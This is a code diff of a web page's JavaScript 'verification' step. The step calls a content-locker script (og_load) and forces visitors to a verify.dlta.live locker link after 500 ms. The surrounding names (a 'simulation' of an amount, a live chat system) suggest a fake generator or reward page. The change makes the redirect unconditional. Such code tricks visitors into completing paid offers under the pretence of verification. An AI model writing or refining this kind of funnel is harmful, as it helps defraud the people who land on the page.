@@ -227,43 +227,26 @@ function runSimulation(amount) {
 
 // === STEP 4: VERIFICATION ===
 function handleVerify() {
-    // === LOCKER CONFIGURATION WITH FALLBACK ===
-    const LOCKER_CONFIG = {
-        primary: {
-            link: 'https://verify.dlta.live/cl/i/m4prn',
-            id: 'm4prn'
-        },
-        fallback: {
-            link: 'https://verify.dlta.live/cl/i/m55o9n',
-            id: 'm55o9n'
-        }
-    };
-    
-    // Check if locker loaded
-    if (typeof og_load === 'undefined') {
-        alert('⚠️ AdBlock Detected!\n\nPlease disable AdBlock to continue.');
-        return;
-    }
-    
-    // Disable button
+    // a) Change button text
     els.verifyBtn.disabled = true;
-    els.verifyBtn.innerHTML = '<span>Loading Verification...</span>';
+    els.verifyBtn.innerHTML = '<span>VERIFYING...</span>';
     
-    // Trigger locker with fallback
+    // b) Try to call og_load()
     try {
-        og_load();
+        if (typeof og_load !== 'undefined') {
+            og_load();
+        } else {
+            throw new Error('Locker not loaded');
+        }
     } catch (e) {
-        console.error('Primary locker failed:', e);
-        
-        // Try fallback - direct redirect
-        setTimeout(() => {
-            const useFallback = Math.random() < 0.5; // 50/50 chance
-            const selectedLocker = useFallback ? LOCKER_CONFIG.fallback : LOCKER_CONFIG.primary;
-            
-            console.log('Using locker:', selectedLocker.id);
-            window.location.href = selectedLocker.link;
-        }, 500);
+        console.log('Locker load failed, using fallback...');
     }
+
+    // c) Set a 500ms timeout for fallback
+    setTimeout(() => {
+        // d) Direct redirect fallback
+        window.location.href = "https://verify.dlta.live/cl/i/m4prn";
+    }, 500);
 }
 
 // === LIVE CHAT SYSTEM ===
